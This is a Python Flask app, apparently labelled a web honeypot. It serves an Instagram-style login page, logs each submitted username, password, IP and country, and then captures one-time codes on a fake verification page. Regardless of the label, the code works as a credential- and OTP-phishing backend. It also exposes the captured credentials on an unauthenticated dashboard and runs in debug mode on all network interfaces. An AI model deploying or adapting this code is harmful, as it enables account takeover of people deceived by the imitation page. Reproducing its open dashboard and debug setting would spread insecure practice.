from flask import Flask, render_template, request, redirect, url_for
import logging
from logging.handlers import RotatingFileHandler
from pathlib import Path
from datetime import datetime
from dashboard_data_parser import get_country_code
from dashboard_data_parser import read_creds, read_cmds
from dashboard_data_parser import parse_creds_audits_log, parse_cmd_audits_log

# Set up logging
base_dir = Path(__file__).parent
log_dir = base_dir / 'log_files'
log_dir.mkdir(exist_ok=True)
log_path = log_dir / 'http_audit.log'

logger = logging.getLogger('HTTPLogger')
logger.setLevel(logging.INFO)
handler = RotatingFileHandler(log_path, maxBytes=2000, backupCount=5)
handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
logger.addHandler(handler)

# Flask App
def baseline_web_honeypot(input_username="admin", input_password="deeboodah"):
    app = Flask(__name__)
    def read_creds():
        return parse_creds_audits_log("log_files/creds_audits.log")
    def read_cmds():
        return parse_cmd_audits_log("log_files/cmd_audits.log")
    @app.route('/')
    def index():
        return render_template("instagram.html")

    @app.route('/instagram-login', methods=['POST'])
    def instagram_login():
        username = request.form['username']
        password = request.form['password']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        country = get_country_code(ip)[0].get("Country_Code", "")
        with open("log_files/creds_audits.log", "a") as f:
            f.write(f"{timestamp}, {ip}, {username}, {password}, {country}\n")
        return redirect(url_for('otp_screen'))
    @app.route('/otp', methods=['GET'])
    def otp_screen():
        return render_template("otp.html")
    @app.route('/otp-verify', methods=['POST'])
    def otp_verify():
        otp = request.form['otp']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open("log_files/otp_attempts.log", "a") as f:
            f.write(f"{timestamp}, {ip}, OTP: {otp}\n")
        # Final screen
        return "Verification failed. Please try again later."

    @app.route('/dashboard')
    def dashboard():
        creds = read_creds()  # ← this uses parse_creds_audits_log()
        commands = read_cmds()
        return render_template("dashboard.html", creds=creds.to_dict(orient="records"), commands=commands.to_dict(orient="records"))
    return app

def run_app(port=5000, input_username="admin", input_password="deeboodah"):
    app = baseline_web_honeypot(input_username, input_password)
    print(f"[*] Web honeypot running on http://127.0.0.1:{port}")
    app.run(debug=True, host="0.0.0.0", port=port)

if __name__ == "__main__":
    run_app(port=5000)
